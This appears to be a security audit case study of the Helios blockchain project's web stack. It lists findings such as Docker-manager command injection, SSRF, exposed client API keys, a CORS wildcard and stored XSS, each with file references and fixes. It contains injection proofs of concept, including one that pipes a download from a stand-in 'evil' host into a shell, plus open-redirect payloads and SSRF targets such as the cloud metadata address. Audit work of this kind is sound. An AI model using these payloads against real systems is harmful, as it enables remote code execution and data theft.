# Helios Web2 Attack Surface — 2026-08 Case Study (10 repos, 6 live hosts)

**Context:** Helios Portal & ETF/Indexer stack audit. Goal: Next.js/React frontends, API routes, auth (wallet connect/JWT/SIWE), SSRF via bridge/ETF metadata fetcher, XSS via token lists (helios-lists), IDOR, CORS, open redirect, file upload, env leak, proxy misconfig, RCE via Docker manager. 6 live hosts: helioschain.network, portal.helioschain.network, hub.helioschain.network, explorer.helioschainlabs.org, app.helioschain.network, testnet.helioschain.network.

**Clone outcome (TencentOS 4, git remote-https missing):**
- `git clone https://…` failed for all 11 with `git: 'remote-https' is not a git command` (`/usr/local/libexec/git-core` lacks git-remote-https). Fallback: `curl -L -o /tmp/<repo>.zip https://github.com/helios-network/<repo>/archive/refs/heads/main.zip` + `unzip -q`.
- Success: helios-portal (415 files), beta-etf-app via tar.gz (zip corrupt — `start of central directory not found`), helios-chronos-app, helios-testnet-react (72M zip), helios-testnet-app, etf-api, helios-docs (24M), helios-network-stats, Helios-Docker-Chain-Manager, helios-lists (master.zip). helios-indexer blocked — zip returned 176k HTML challenge + `api.github.com 403 rate limit exceeded for 43.156.23.22`.
- Org: `curl -s https://api.github.com/orgs/helios-network/repos?per_page=100 | jq -r '.[].name'` — 40 repos, helios-indexer size 0 (ghost), helios-lists master branch not main.

**Live host triage (curl -I -L -w):**
| Host | Status | Notes |
|------|--------|-------|
| helioschain.network | 200 Cloudflare `X-Frame DENY` | SPA Next.js, /robots 200 /sitemap 200 /.env 403 /api 200 (SPA fallback) /swagger 200 (HTML) |
| portal.helioschain.network | 200 Vercel `X-Powered-By Next.js` | title `Helios Portal…`, /.env 403, no CORS wildcard |
| hub.helioschain.network | 200 Cloudflare | docs |
| explorer.helioschainlabs.org | 200 nginx/1.22.1 Next.js | /api 301→502, /swagger 308 |
| app.helioschain.network | 200 Vercel `access-control-allow-origin: *` `X-Vercel-Cache HIT` | title `Helios Beta Mainnet` |
| testnet.helioschain.network | 404 `X-Vercel-Error: DEPLOYMENT_NOT_FOUND` | dead, still in sitemap |

Open-redirect payloads `/%09/evil.com`, `//evil.com`, `/redirect?url=https://evil.com`, `/api/redirect?url=…` → no redirect (404/200 SPA) on any host. Env leak `/.env`, `/.env.local`, `/next.config.js`, `/.git/HEAD` → 403/404.

**Finding map (file:line — verified):**

1. **RCE — Docker Manager command injection (CRITICAL, pre-auth chain)**
   - `Helios-Docker-Chain-Manager/application/setup-node.js:41` `execWrapper(`heliades init ${moniker} --chain-id ${chainId}`)`; `:43` `heliades keys add user0 --from-private-key="${privateKey}"`; `:118,121,123` same. `exposition/POST-setup-node.js:19-30` reads `moniker,chainId,password,genesisURL,nodeIP/Id/ports,mode` raw from `req.body`.
   - `utils/exec-wrapper.js:6` `exec(cmd)` — no sanitization. `POST-execute-compact-application-db.js:14`, `POST-execute-compact-goleveldb.js:14`, `POST-execute-db-info.js:14`, `POST-execute-rollback.js:11` `execWrapper(command)` from POST body.
   - Auth: `utils/middlewares.js:57-75` checks `req.headers[access-code] || req.query[access-code] == environement.password`, password plain in `~/.password` (`server.js:30`), 10s brute-force delay only, `CORS *` (`server.js:19 corsUtils.setCors('*')`, `middlewares.js:59 Access-Control-Allow-Origin *`) → cross-origin brute force, `POST /action` → `automation.js:doAction` dispatcher.
   - PoC: `moniker="a; id > /tmp/pwn;"` or `chainId="42000; curl http://evil|sh; echo"` → shell.

2. **SSRF**
   - `exposition/POST-setup-node.js:33` + `setup-node.js:34` `fileGetContent(genesisURL)` where genesisURL=user body → `utils/file-get-content.js:10-70` http/https.request with redirect follow, no allowlist → `http://169.254.169.254/latest/meta-data/` or `http://localhost:8545`.
   - `exposition/POST-download-snapshot.js:55-96` `fetch(headerUrl)` / `fetch(finalDownloadUrl)` arbitrary URLs, writes to `homeDirectory/backups/finalFilename` (sanitizeFilename blocks `../` but not SSRF/DoS).
   - `exposition/POST-call-rpc.js:8-15` proxies `method/params` to `http://localhost:8545` JSON-RPC with `$address` substitution — arbitrary `eth_*` method if node online.
   - `etf-api` chainlink `src/modules/chainlink-data-feeds/chainlink-data-feeds.service.ts:144` `fetch(url)` hardcoded `https://reference-data-directory.vercel.app/feeds-*.json` — safe, not SSRF.

3. **Secrets in client bundle (HIGH)**
   - `helios-portal/lib/api/apiClient.ts:109` `API_URL = process.env.NEXT_PUBLIC_BASE_API_URL || ""` `:145` `if(NEXT_PUBLIC_API_KEY) defaultHeaders["x-api-key"]=…` — t3-env `env.ts` `client:` block exposes in `_next/static` chunks. Same `beta-etf-app/lib/api/apiClient.ts:130`.

4. **CORS wildcard (MEDIUM)**
   - Live: `app.helioschain.network` `access-control-allow-origin: *`. Code: `etf-api/src/config/configuration.ts:108-111` `origins: CORS_ORIGINS ? split : '*'`, `src/main.ts:34-41` `enableCors({origin:'*', credentials:false})` when unset.

5. **Vanilla JS stored XSS (MEDIUM)**
   - `helios-network-stats/public/js/render.js:58` ``<div class="name">${n.name}</div>`` `:109` `el.nodesEl.innerHTML = arr.map(rowHtml).join('')` `:137` `row.outerHTML = rowHtml(n)` — n.name from unauth WS, unescaped. React `{token.display.name}` auto-escaped → safe; this is true positive because vanilla.
   - `helios-portal/app/layout.tsx:37,51` `dangerouslySetInnerHTML` only for static Clarity/GTM → false positive.

6. **Next.js images SSRF (MEDIUM)**
   - `helios-chronos-app/next.config.ts:6` `hostname:"**"` wildcard.

7. **IDOR / admin (LOW — dormant)**
   - `etf-api/src/modules/portfolio/portfolio.controller.ts:30` `@Get(':address')` validates `^0x[a-fA-F0-9]{40}$` but public enumerable (design). `rewards.controller.ts:22` same. `admin/admin.controller.ts:25-177` POST heavy jobs no guard, but `app.module.ts:39` `// AdminModule` commented — dormant.

**Remediation (one-liners):**
```diff
- execWrapper(`heliades init ${moniker} --chain-id ${chainId}`)
+ spawn('heliades', ['init', moniker, '--chain-id', chainId]) // + allowlist /^[a-zA-Z0-9_-]{1,32}$/
- if(NEXT_PUBLIC_API_KEY) headers["x-api-key"]=process.env.NEXT_PUBLIC_API_KEY
+ // move to server env + API route proxy, rotate leaked key
- hostname:"**"
+ hostname:"coin-images.coingecko.com" // explicit allowlist
- el.nodesEl.innerHTML = arr.map(rowHtml).join('')
+ el.nodesEl.textContent = n.name // or DOMPurify.sanitize
```
